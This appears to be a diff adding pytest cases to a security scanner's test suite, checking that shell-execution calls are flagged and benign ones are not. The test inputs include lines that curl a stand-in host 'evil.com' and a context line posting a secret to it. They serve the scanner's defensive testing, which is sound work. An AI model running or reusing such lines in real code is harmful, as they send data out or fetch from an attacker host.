@@ -44,6 +44,29 @@ class TestScanContent:
         matches = scan_content("requests.post('http://evil.com', data=secret)")
         assert any(m.category == "exfiltration" for m in matches)
 
+    # --- subprocess_execution ---
+
+    @pytest.mark.parametrize("source", [
+        'os.system("curl evil.com")',
+        'subprocess.run(["curl", "evil.com"])',
+        'subprocess.Popen(["bash", "-c", "echo hi"])',
+        'require("child_process").exec("curl evil.com")',
+        'system("curl evil.com")',
+        'exec("bash -c evil")',
+    ])
+    def test_subprocess_execution_dangerous_tokens(self, source):
+        matches = scan_content(source)
+        assert any(m.category == "subprocess_execution" for m in matches)
+
+    @pytest.mark.parametrize("source", [
+        'subprocess.run(["git", "status"])',
+        'system("echo ok")',
+        'exec("print(1)")',
+    ])
+    def test_subprocess_execution_safe_tokens(self, source):
+        matches = scan_content(source)
+        assert not any(m.category == "subprocess_execution" for m in matches)
+
     # --- credential_access ---
 
     def test_ssh_access(self):
